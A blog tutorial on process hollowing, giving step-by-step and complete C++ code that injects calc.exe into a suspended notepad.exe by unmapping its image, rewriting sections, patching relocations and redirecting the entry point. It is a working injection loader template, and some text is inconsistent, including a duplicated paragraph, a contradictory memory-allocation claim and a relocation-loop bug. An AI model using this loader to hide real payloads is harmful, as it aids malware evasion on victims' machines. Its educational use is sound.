---
title: Process Hollowing
date: 06-05-2023 12:00:00 -500
name: Terry-ngyx
featured-img: /assets/images/process_hollowing.png
categories: []
tags: []
---
## Introduction
![Process Injection](/assets/images/process_hollowing.png)

 In this article, we'll go through a proof-of-concept of process hollowing and how it is different from other process injection techniques.

## What's Process Injection

Process hollowing is a type of process injection which is used to execute malicious code within the context of a remote process. While it shares similarities with generic process injection, there are several differences between the two techniques. Some of the main differences include:

- Process hollowing requires the target process to be suspended before the injection process can begin. This is necessary to ensure that the process is not actively executing any code that could interfere with the injection.
- Unlike generic process injection, process hollowing does not allocate additional memory in the target process. As a result, the size of the injected code must not exceed the available memory space in the target process.
- Process hollowing requires the unmapping of the sections of the target process. This is done to allocate space for the injected code and to prevent conflicts with any existing code in the process.
- Unlike generic process injection, process hollowing does not require the creation of a new remote thread. Instead, the suspended process or thread can be resumed after the malicious code has been injected, effectively replacing the original code with the injected code.

## Detailed Overview
Process hollowing is a technique that enables the execution of malicious code within the context of a remote process, and its methodology is similar to that of generic process injection. The typical steps for carrying out process hollowing are:
\
&nbsp; 
&emsp;[1. Obtaining suspended process](#obtaining-suspended-process)
\
&nbsp;
&emsp;[2. Obtaining malicious code](#obtaining-malicious-code)
\
&nbsp;
&emsp;[3. Unmapping target process](#unmapping-target-process)
\
&nbsp;
&emsp;[4. Allocating memory in the target process](#allocating-memory-in-the-target-process)
\
&nbsp;
&emsp;[5. Writing the NT header from the malicious code to the target process](#writing-the-nt-header-from-the-malicious-code-to-the-target-process)
\
&nbsp;
&emsp;[6. Writing each section from the malicious code to the target process](#writing-each-section-from-the-malicious-code-to-the-target-process)
\
&nbsp;
&emsp;[7. Modifying malicious code for compatibility](#modifying-malicious-code-for-compatibility)
\
&nbsp;
&emsp;[8. Patching the entry point of the suspended target process](#patching-the-entry-point-of-the-suspended-target-process)
\
&nbsp;
&emsp;[9. Resume the target process](#resume-the-target-process)

## Obtaining suspended process
To simplify the process, we will create a new process in a suspended state instead of locating an already suspended process. In this example, we will be using notepad.exe as our target process to be hollowed and injected with the malicious code.

```cpp
// create destination process - this is the process to be hollowed out
LPSTARTUPINFOA si = new STARTUPINFOA();
LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();

CreateProcessA((LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
```

## Obtaining malicious code
The purpose of this section is to read the calc.exe PE file from the disk and load it into memory as the source image or malicious code for the process hollowing technique. It is important to note that the offsets used to access the sections of the PE file will be pointers to the raw data and not the virtual addresses, as the file is not mapped in memory yet.

```cpp
// read source file - this is the file that will be executed inside the hollowed process
HANDLE sourceFile = CreateFileA((LPCSTR)"c:\\windows\\syswow64\\calc.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
DWORD64 sourceFileSize = GetFileSize(sourceFile, NULL);
LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
```

## Unmapping target process

Unmapping the sections in the target process can be carried out by calling the NtUnmapViewOfSection native API. However before that, we would also need to utilise the NtQueryInformationProcess to obtain the image base address of the target process. Since native APIs cannot be called directly, we would need to utilise function pointers. Therefore, we would need to define the function pointers as shown below. 

```cpp
// define function pointer for NtQueryInformationProcess
typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
	IN  HANDLE ProcessHandle,
	IN  PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN  ULONG ProcessInformationLength,
	OUT PULONG ReturnLength    OPTIONAL
	);

pfnNtQueryInformationProcess gNtQueryInformationProcess;

// define function pointer NtUnmapViewOfSection
typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(
	IN HANDLE ProcessHandle, 
	IN PVOID BaseAddress
	);

pfnNtUnmapViewOfSection gNtUnmapViewOfSection;
```
When calling the NtUnmapViewOfSection function, two arguments are required: the process handle and the base address of the target process. In our case, the target process is the suspended notepad.exe process, and the process handle can be found in the PROCESS_INFORMATION struct which was passed as a parameter during the CreateProcessA API call. However, retrieving the image base address is not a straightforward process. To obtain it, we need to examine the PEB structure of the process, which requires calling the NtQueryInformationProcess native API. To achieve this, we can utilize dynamic runtime linking to obtain the address of the NtQueryInformationProcess function and then cast it to the previously defined function pointer. Lastly, we can call the NtQueryInformationProcess function where we can obtain the  PROCESS_BASIC_INFORMATION object, containing the base address of our PEB. Once the PEB structure has been obtained, the pointer to the imagebase address is located at an offset of 0x08 from the PEB base address (Note that this offset is for 32-bit processes). We can then utilise ReadProcessMemory to obtain the image base address of the target process.

```cpp
// utilise runtime dynamic linking to obtain a function pointer to NtQueryInformationProcess
HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
gNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll,
	"NtQueryInformationProcess");

HANDLE destProcess = pi->hProcess;
// get destination imageBase offset address from the PEB by calling NtQueryInformationProcess
gNtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
DWORD_PTR pebImageBaseOffset = (DWORD_PTR)pbi->PebBaseAddress + 8;

// get destination imageBaseAddress
LPVOID destImageBase = 0;
ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, NULL);
```
With the necessary information retrieved and the function pointer defined, we can finally call the NtUnmapViewOfSection function using the same runtime dynamic linking method. We can then invoke the function by calling it with the corresponding parameters. With this step completed, we have successfully unmapped the image section from the target process, allowing us to modify it as needed.

```cpp
// unmap the target process by calling NtUnmapViewOfSection
gNtUnmapViewOfSection = (pfnNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
gNtUnmapViewOfSection(destProcess, destImageBase);
```
The image below shows the memory contents of notepad.exe in the HxD Hex Editor before and after calling NtUnmapViewOfSection

![HxD Process Hollowing](/assets/images/hxd_process_hollowing.png)

## Allocating memory in the target process
With the image section successfully unmapped, we can now allocate the necessary memory in the target process using the VirtualAllocEx function, as demonstrated below. It's worth noting that the size of the allocated memory should match the size of the image that we want to inject to ensure that there is enough memory for our modifications.

```cpp
// obtain image size of the source image
PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
DWORD sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

// allocate memory in the target process
VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

## Writing the NT header from the malicious code to the target process
Another critical step in the injection process is to copy the NT headers of the source image to the target process. Before we do that, we would need to patch the image base specified in the header. At this stage, I am storing the original source image base in a variable so that we can use it in later sections. Patching the image base is necessary because it ensures that any dependencies required by the injected image is loaded at the correct address in memory within the target process.

We can carry this out by simply modifying the NT header structure directly and then using WriteProcessMemory to write the NT header to the target process.

```cpp
// save the source image base before patching for calculating delta in later sections
DWORD sourceImageBase = (DWORD)sourceImageNTHeaders->OptionalHeader.ImageBase;

// patch the image base of the source image
sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
WriteProcessMemory(destProcess, destImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
```
## Writing each section from the malicious code to the target process
Now that we have memory allocated in the target process, the next step is to copy the necessary sections from the source image (containing our malicious code) into the target process. However, it's important to note that the source image is currently unmapped and needs to be mapped in the target process.

To map the sections of the source image, we first need to obtain the source and destination addresses for each section. The source addresses can be retrieved by looping through the different image sections and accessing the pointer to raw data variables defined in the image section structure. The destination address is determined by summing the destination image base address and the virtual address of the sections. The virtual addresses of the sections are also defined in the image section structure.

In simpler terms: -

1. When reading the sections from the source image, we use the pointer to raw data variables as the source addresses. 
2. When writing the sections to the target image, the destination addresses would be the virtual addresses for each section, indicating where it should sit in the mapped memory of the target process. 

With these addresses identified, we can proceed with mapping the image and copying the sections into the allocated memory of the target process. While looping through the image sections, we can also obtain the raw address and the size of the base relocation table which we can use in the next section.

```cpp
// copy each section from the source to the destination
PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS32));
DWORD sectionsCount = sourceImageNTHeaders->FileHeader.NumberOfSections;
DWORD relocationAddress;
DWORD relocationTableSize;

for (int i = 0; i < sectionsCount; i++) {
	// sourceImageSection->VirtualAddress is the offset where the section will be loaded in memory.
	PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);

	// sourceImageSection->PointerToRawData is the location of the section on disk.
	PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
	WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);

	// get relocation table address and size for base relocation patching in the next step
	BYTE* reloc = (BYTE*)".reloc";
	if ((memcmp(reloc, sourceImageSection->Name, 5) == 0)) {
		relocationAddress = (DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData;
		relocationTableSize = (DWORD)sourceImageSection->SizeOfRawData;
	}

	sourceImageSection++;
}
```

## Modifying malicious code for compatibility
To patch the base relocation tables, we'll be using a method similar to the one shown in the generic process injection technique. However, there is a key difference: instead of patching the addresses in our own process and then injecting the modified image into the remote process (like we did for the generic process injection), we'll be patching the addresses directly in the remote process itself.

```cpp
// calculate delta
DWORD deltaImageBase = ((DWORD)destImageBase - sourceImageBase);

// patch the base relocation table
IMAGE_DATA_DIRECTORY relocationTable = (IMAGE_DATA_DIRECTORY)sourceImageNTHeaders->OptionalHeader.DataDirectory[5];
PIMAGE_BASE_RELOCATION imageBaseRelocation = (PIMAGE_BASE_RELOCATION)(DWORD)relocationAddress;
DWORD relocationOffset = 0;

while (imageBaseRelocation->SizeOfBlock) {
	DWORD relocationEntriesCount = (imageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
	PBASE_RELOCATION_ENTRY baseRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD)imageBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
	for (int i = 0; i < relocationEntriesCount; i++) {
		if (baseRelocationEntry->Type == 0) {
			continue;
		}
		DWORD buffer = 0;
		DWORD patchAddress = (DWORD)destImageBase + imageBaseRelocation->VirtualAddress + baseRelocationEntry->Offset;
		ReadProcessMemory(destProcess, (LPCVOID)(patchAddress), &buffer, sizeof(DWORD), NULL);
		buffer += deltaImageBase;

		WriteProcessMemory(destProcess, (PVOID)(patchAddress), &buffer, sizeof(DWORD), NULL);
		baseRelocationEntry++;
	}

	imageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD)imageBaseRelocation + imageBaseRelocation->SizeOfBlock);
}
```

## Patching the entry point of the suspended target process
At this stage, we now have the malicious code injected into the target process. Before we resume the process, we would still need to ensure that the target process executes. Therefore, we would need to patch the entry point of the main thread of the process. The entry point of the thread is defined in the context structure, eax for 32-bit and ecx for 64-bit. 

At this stage, we now have the malicious code injected into the target process. Before we resume the process, we would still need to ensure that the target process executes at the correct entry point. To accomplish this, we must patch the entry point of the main thread of the process. The entry point is defined in the context structure, with **`EAX`** holding the value for 32-bit processes and **`RCX`** holding the value for 64-bit processes.

By patching the entry point, we're effectively redirecting the thread's execution to the location of our injected code. Once the thread resumes execution, it will execute our malicious code rather than continuing with the process's original entry point.

```cpp
// create a pointer to a new context object
LPCONTEXT context = new CONTEXT();

// define the context flags
context->ContextFlags = CONTEXT_INTEGER;

// call get thread context
GetThreadContext(pi->hThread, context);

// update dest image entry point to the new entry point of the source image and resume dest image thread

// get the patched entry point
DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;

// replace the entry point defines in the eax variable with the patched entry point
context->Eax = patchedEntryPoint;

// set the thread context
SetThreadContext(pi->hThread, context);
```

## Resume the target process
```cpp
// resume the suspended process
ResumeThread(pi->hThread);
```

## Complete code
```cpp
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>

using namespace std;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
}BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

// define function pointer for NtQueryInformationProcess
typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
	IN  HANDLE ProcessHandle,
	IN  PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN  ULONG ProcessInformationLength,
	OUT PULONG ReturnLength    OPTIONAL
	);

pfnNtQueryInformationProcess gNtQueryInformationProcess;

// define function pointer NtUnmapViewOfSection
typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(
	IN HANDLE ProcessHandle, 
	IN PVOID BaseAddress
	);

pfnNtUnmapViewOfSection gNtUnmapViewOfSection;

void _tmain(int argc, TCHAR* argv[]) {

	// create destination process - this is the process to be hollowed out
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();

	CreateProcessA((LPSTR)"c:\\windows\\syswow64\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);

	// read source file - this is the file that will be executed inside the hollowed process
	HANDLE sourceFile = CreateFileA((LPCSTR)"c:\\windows\\syswow64\\calc.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD64 sourceFileSize = GetFileSize(sourceFile, NULL);
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);

	// utilise runtime dynamic linking to obtain a function pointer to NtQueryInformationProcess
	HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
	gNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll,
		"NtQueryInformationProcess");

	HANDLE destProcess = pi->hProcess;
	// get destination imageBase offset address from the PEB by calling NtQueryInformationProcess
	gNtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	DWORD_PTR pebImageBaseOffset = (DWORD_PTR)pbi->PebBaseAddress + 8;

	// get destination imageBaseAddress
	LPVOID destImageBase = 0;
	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, NULL);

	// unmap the target process by calling NtUnmapViewOfSection
	gNtUnmapViewOfSection = (pfnNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	gNtUnmapViewOfSection(destProcess, destImageBase);

	// obtain image size of the source image
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	DWORD sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

	// allocate memory in the target process
	VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// patch the image base of the source image
	//save the source image base before patching for calculating delta in later sections
	DWORD sourceImageBase = (DWORD)sourceImageNTHeaders->OptionalHeader.ImageBase;
	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
	WriteProcessMemory(destProcess, destImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// copy each section from the source to the destination
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS32));
	DWORD sectionsCount = sourceImageNTHeaders->FileHeader.NumberOfSections;
	DWORD relocationAddress;
	DWORD relocationTableSize;

	for (int i = 0; i < sectionsCount; i++) {
		// sourceImageSection->VirtualAddress is the offset where the section will be loaded in memory.
		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);

		// sourceImageSection->PointerToRawData is the location of the section on disk.
		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);

		// get relocation table address and size for patching
		BYTE* reloc = (BYTE*)".reloc";
		if ((memcmp(reloc, sourceImageSection->Name, 5) == 0)) {
			relocationAddress = (DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData;
			relocationTableSize = (DWORD)sourceImageSection->SizeOfRawData;
		}

		sourceImageSection++;
	}

	// calculate delta
	DWORD deltaImageBase = ((DWORD)destImageBase - sourceImageBase);

	// patch the base relocation table
	IMAGE_DATA_DIRECTORY relocationTable = (IMAGE_DATA_DIRECTORY)sourceImageNTHeaders->OptionalHeader.DataDirectory[5];
	PIMAGE_BASE_RELOCATION imageBaseRelocation = (PIMAGE_BASE_RELOCATION)(DWORD)relocationAddress;
	DWORD relocationOffset = 0;

	while (imageBaseRelocation->SizeOfBlock) {
		DWORD relocationEntriesCount = (imageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY baseRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD)imageBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
		for (int i = 0; i < relocationEntriesCount; i++) {
			if (baseRelocationEntry->Type == 0) {
				continue;
			}
			DWORD buffer = 0;
			DWORD patchAddress = (DWORD)destImageBase + imageBaseRelocation->VirtualAddress + baseRelocationEntry->Offset;
			ReadProcessMemory(destProcess, (LPCVOID)(patchAddress), &buffer, sizeof(DWORD), NULL);
			buffer += deltaImageBase;

			WriteProcessMemory(destProcess, (PVOID)(patchAddress), &buffer, sizeof(DWORD), NULL);
			baseRelocationEntry++;
		}

		imageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD)imageBaseRelocation + imageBaseRelocation->SizeOfBlock);
	}

	// create a pointer to a new context object
	LPCONTEXT context = new CONTEXT();

	// define the context flags
	context->ContextFlags = CONTEXT_INTEGER;

	// call get thread context
	GetThreadContext(pi->hThread, context);

	// update dest image entry point to the new entry point of the source image and resume dest image thread

	// get the patched entry point
	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;

	// replace the entry point defines in the eax variable with the patched entry point
	context->Eax = patchedEntryPoint;

	// set the thread context
	SetThreadContext(pi->hThread, context);

	// resume the suspended process
	ResumeThread(pi->hThread);
	return;
}
```

## References
- [https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#code](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#code)

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
